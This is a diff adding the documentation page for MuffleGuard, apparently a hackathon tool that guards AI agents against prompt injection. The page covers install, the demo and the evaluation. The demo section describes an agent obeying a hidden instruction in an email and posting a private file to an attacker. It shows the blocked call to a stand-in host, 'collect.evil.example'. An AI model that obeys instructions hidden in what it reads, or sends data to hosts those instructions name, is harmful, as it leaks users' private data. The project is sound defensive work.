@@ -1,0 +1,213 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Docs — MuffleGuard</title>
+<meta name="description" content="Install MuffleGuard, run the demo offline, reproduce the evaluation, and read what the guard does not claim.">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><rect width='32' height='32' fill='%23f3f2f2'/><path d='M5 25V7l8 9 8-9v18' fill='none' stroke='%23201e1d' stroke-width='3.4'/></svg>">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Archivo:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="assets/ds.css">
+<link rel="stylesheet" href="assets/site.css">
+<style>
+  /* Docs-only layout: a column of prose with a rail of links beside it. */
+  .docs { display: grid; grid-template-columns: 220px minmax(0, 1fr); gap: clamp(32px, 5vw, 72px); align-items: start; }
+  @media (max-width: 900px) { .docs { grid-template-columns: 1fr; } .rail { position: static !important; } }
+  .rail { position: sticky; top: 104px; }
+  .rail a { display: block; padding: 7px 0; font-size: 14px; color: var(--ink-soft); text-decoration: none; border-left: 2px solid transparent; padding-left: 12px; }
+  .rail a:hover, .rail a.on { color: var(--color-text); border-left-color: var(--color-accent); }
+  .doc h2 { font-size: clamp(26px, 2.6vw, 36px); margin-top: 8px; }
+  .doc h3 { margin-top: 36px; }
+  .doc section + section { margin-top: clamp(44px, 5vw, 72px); padding-top: clamp(32px, 4vw, 48px); border-top: var(--hair); }
+  .doc p, .doc li { max-width: 68ch; }
+  .doc ul { padding-left: 20px; }
+  .doc li { margin-bottom: 8px; }
+  pre { background: #15120f; color: #e9e3dd; padding: 16px 18px; overflow-x: auto; font-family: var(--mono); font-size: 13.5px; line-height: 1.65; margin: 16px 0; }
+  code { font-family: var(--mono); font-size: 0.92em; }
+  :not(pre) > code { background: var(--color-surface); padding: 2px 6px; }
+  .note { border-left: 3px solid var(--color-accent); background: var(--color-accent-100); padding: 14px 16px; margin: 18px 0; }
+  .note p { margin: 0; font-size: 15px; }
+</style>
+</head>
+<body>
+
+<svg width="0" height="0" style="position:absolute" aria-hidden="true">
+  <symbol id="mg" viewBox="0 0 300 44">
+    <path class="mg-m" d="M4 40V5l15.5 17L35 5v35" fill="none" stroke="currentColor" stroke-width="7.5" stroke-linejoin="miter"/>
+    <path class="mg-g" d="M74.5 15.5A14.5 14.5 0 1 0 77 29H63.5" fill="none" stroke="currentColor" stroke-width="7.5"/>
+    <path class="mg-bar" d="M63.5 25.5H79l-3.5 7H63.5z" fill="#ec3013"/>
+    <text class="mg-word" x="96" y="33" font-family="Archivo, system-ui, sans-serif" font-size="30" font-weight="800" letter-spacing="-0.9" fill="currentColor">Muffle<tspan fill="#ec3013">Guard</tspan></text>
+  </symbol>
+</svg>
+
+<header class="nav">
+  <a class="brand" href="index.html" aria-label="MuffleGuard, home">
+    <svg viewBox="0 0 300 44" role="img" aria-hidden="true"><use href="#mg"/></svg>
+  </a>
+  <nav class="nav__links">
+    <a href="index.html#attack">The attack</a>
+    <a href="index.html#how">How it works</a>
+    <a href="index.html#proof">Proof</a>
+    <a class="btn btn--sm btn--solid" href="https://attack-lab-production.up.railway.app">Attack Lab</a>
+  </nav>
+</header>
+
+<main>
+  <section class="shell" style="padding-block:clamp(48px,6vw,88px) clamp(32px,4vw,56px)">
+    <p class="eyebrow" data-rise>Documentation</p>
+    <h1 style="font-size:clamp(34px,4.4vw,58px);line-height:1.02;font-weight:900;max-width:20ch">Run it, break it, and check the numbers.</h1>
+    <p class="lede" style="margin-top:18px">
+      Everything here works offline. The model responses the demo replays are committed,
+      so no key and no account is needed to see the attack or reproduce the evaluation.
+    </p>
+  </section>
+
+  <section class="band band--tight">
+    <div class="shell docs">
+      <nav class="rail" aria-label="On this page">
+        <a href="#install">Install</a>
+        <a href="#demo">Run the demo</a>
+        <a href="#lab">The Attack Lab</a>
+        <a href="#eval">Reproduce the evaluation</a>
+        <a href="#guard">Using the guard</a>
+        <a href="#limits">What it does not claim</a>
+        <a href="#privacy">Privacy</a>
+        <a href="#credits">Credits</a>
+      </nav>
+
+      <div class="doc">
+        <section id="install">
+          <h2>Install</h2>
+          <p>Python 3.11. Nothing else is required to run the tests or the offline demo.</p>
+<pre>git clone https://github.com/Trafalgar-2006/MuffleGuard
+cd MuffleGuard
+python -m venv .venv
+.venv/Scripts/python -m pip install -r requirements-dev.txt</pre>
+          <p>On Linux or macOS use <code>.venv/bin/python</code> in place of <code>.venv/Scripts/python</code>.</p>
+          <p>The sentence classifiers are optional and are not downloaded automatically. Without them the policy engine and the hidden-text decoder still run, which is what the headline result measures.</p>
+<pre>.venv/Scripts/python -m pip install huggingface_hub
+.venv/Scripts/hf download protectai/deberta-v3-base-prompt-injection-v2
+.venv/Scripts/hf download Horizon-Labs/prompt-injection-guard-small</pre>
+        </section>
+
+        <section id="demo">
+          <h2>Run the demo</h2>
+          <p>The same request twice: once with no guard, once with the guard and every content defence switched off.</p>
+<pre>.venv/Scripts/python tools/hero_attack.py --no-muffle</pre>
+          <p>Undefended, the agent obeys an instruction nobody can see and posts a private file to the attacker. Defended, the model still obeys, and the call is refused:</p>
+<pre>BLOCK http_post(url='https://collect.evil.example/u', ...)
+      The url 'collect.evil.example' came from
+      email #5 from hr@corp.example, not from you.</pre>
+          <div class="note"><p>Drop <code>--no-muffle</code> to see the instruction removed before the model reads it, or add <code>--detector</code> to run the classifiers as well.</p></div>
+        </section>
+
+        <section id="lab">
+          <h2>The Attack Lab</h2>
+          <p>The same story in a browser, with both runs side by side and every step streamed as it happens.</p>
+<pre>.venv/Scripts/python -m uvicorn web.app:app --port 8000</pre>
+          <p>Set <code>DEMO_TAMPER=1</code> to expose the button that edits an entry in the audit log, so you can watch verification catch it. There is a live one at <a href="https://attack-lab-production.up.railway.app">attack-lab-production.up.railway.app</a>.</p>
+          <h3>Settings</h3>
+          <ul>
+            <li><code>LLM_API_KEY</code>, <code>LLM_BASE_URL</code>, <code>LLM_MODEL</code> — any OpenAI-compatible provider. Without a key the demo replays its recorded run.</li>
+            <li><code>DEMO_PASSCODE</code> — gates the API. Leave empty for an open demo.</li>
+            <li><code>DEMO_DAILY_RUNS</code> — a ceiling on live model calls per day; past it the demo replays instead of spending.</li>
+            <li><code>TRUST_PROXY=1</code> — only when a platform proxy sits in front, so the rate limit counts the forwarded address.</li>
+            <li><code>LLM_CACHE=1</code> — opt in to caching live responses on disk. Off by default.</li>
+          </ul>
+        </section>
+
+        <section id="eval">
+          <h2>Reproduce the evaluation</h2>
+          <p>216 runs: eight ordinary tasks crossed with eight attack deliveries, each under three defences. Deterministic, and free.</p>
+<pre>.venv/Scripts/python -m evaluation.run --adversary</pre>
+          <p>The agent is a deterministic stand-in that obeys every instruction it can actually see. It is not a model and is not presented as one: it measures the guard's own property rather than how gullible a particular model is on a particular day. Because it reads only what the guard let through, muffling genuinely stops it.</p>
+          <p>Swap <code>--adversary</code> for a real model by configuring a provider; that path needs credit and reports the model it used.</p>
+        </section>
+
+        <section id="guard">
+          <h2>Using the guard</h2>
+          <p>One seam. Every checkpoint goes through it, and nothing else decides anything.</p>
+<pre>from muffleguard.guard import Event, Guard
+from sandbox.tools import DESCRIPTIONS, SPECS
+
+guard = Guard(tools=SPECS, detector=None, descriptions=DESCRIPTIONS)
+
+guard.check(Event(kind="request", text=user_text))
+guard.check(Event(kind="tool_result", tool="inbox_read", text=body, label="email #5"))
+verdict = guard.check(Event(kind="tool_call", tool="email_send", args=args))
+if verdict.decision.value == "block":
+    print(verdict.headline)</pre>
+          <p>A tool is described by a <code>ToolSpec</code> that says what it can reach: whether it returns attacker-controlled content, whether it touches private data, whether it can send things out, and which of its arguments name a target. Adding a tool means declaring its reach, never writing a new rule.</p>
+          <div class="note"><p>Pass <code>descriptions=</code> so the guard pins what each tool claims to do at startup. A description edited afterwards, by a dependency or a compromised MCP server, is refused rather than obeyed.</p></div>
+        </section>
+
+        <section id="limits">
+          <h2>What it does not claim</h2>
+          <ul>
+            <li>The audit log is tamper-<em>evident</em>, not tamper-proof. Its recorded head catches a deleted tail, but anyone who can rewrite the database can rewrite both.</li>
+            <li>URL provenance checks the host only. Scheme, port, path, DNS result and redirect destination need separate controls in a real network adapter.</li>
+            <li>An address you paste into your own request is yours. The guard answers who chose a target, and in that case you did.</li>
+            <li>The egress scan is heuristic: recognised secret formats and copied runs of words, not every encoding or paraphrase.</li>
+            <li>Detector thresholds are untuned, so no claim is made about the classifiers. The measured result does not use them.</li>
+            <li>The tools are an in-memory fake world. Real mail, file or HTTP access needs its own authorisation and SSRF protection.</li>
+          </ul>
+          <p>Both known gaps are asserted as they behave in <code>tests/test_redteam.py</code> rather than described as fixed.</p>
+        </section>
+
+        <section id="privacy">
+          <h2>Privacy</h2>
+          <p>The detectors are ONNX on the CPU, so content checked by them never leaves the machine. The policy engine consults no model at all.</p>
+          <p>The agent's own model provider does see the request and the tool results, as any agent's would. Caching those responses to disk is off unless <code>LLM_CACHE=1</code> is set; the responses committed to <code>demo_cache/</code> are the synthetic sandbox only.</p>
+        </section>
+
+        <section id="credits">
+          <h2>Credits</h2>
+          <ul>
+            <li><a href="https://huggingface.co/protectai/deberta-v3-base-prompt-injection-v2">protectai/deberta-v3-base-prompt-injection-v2</a> — Apache-2.0</li>
+            <li><a href="https://huggingface.co/Horizon-Labs/prompt-injection-guard-small">Horizon-Labs/prompt-injection-guard-small</a> — Apache-2.0</li>
+            <li>onnxruntime, tokenizers, numpy, FastAPI, Starlette, uvicorn, httpx, pytest, Hypothesis, GSAP with ScrollTrigger (no-charge licence)</li>
+            <li>Archivo typeface via Google Fonts — SIL OFL 1.1</li>
+            <li>Verhoeff and Luhn checksums implemented from their published definitions</li>
+          </ul>
+          <p>The sandbox inbox, files and attacks are written by us. No real account or personal data is used anywhere. Developed with Claude Code as a pair, disclosed in the README.</p>
+        </section>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer class="foot">
+  <div class="shell">
+    <div class="foot__base" style="margin-top:0;border-top:0">
+      <span>MuffleGuard — TatHack '26, Track 2. Apache-2.0.</span>
+      <span><a href="https://github.com/Trafalgar-2006/MuffleGuard" style="display:inline">GitHub</a></span>
+    </div>
+  </div>
+</footer>
+
+<script src="https://cdn.jsdelivr.net/npm/gsap@3.12.5/dist/gsap.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/gsap@3.12.5/dist/ScrollTrigger.min.js"></script>
+<script src="assets/motion.js"></script>
+<script>
+  /* The rail marks the section you are reading. Nothing else on this page
+     moves: documentation is for reading, not for watching. */
+  (function () {
+    if (!window.gsap) return;
+    const links = [...document.querySelectorAll(".rail a")];
+    links.forEach((a) => {
+      const id = a.getAttribute("href").slice(1);
+      const section = document.getElementById(id);
+      if (!section) return;
+      ScrollTrigger.create({
+        trigger: section,
+        start: "top 30%",
+        end: "bottom 30%",
+        onToggle: (self) => a.classList.toggle("on", self.isActive),
+      });
+    });
+  })();
+</script>
+</body>
+</html>
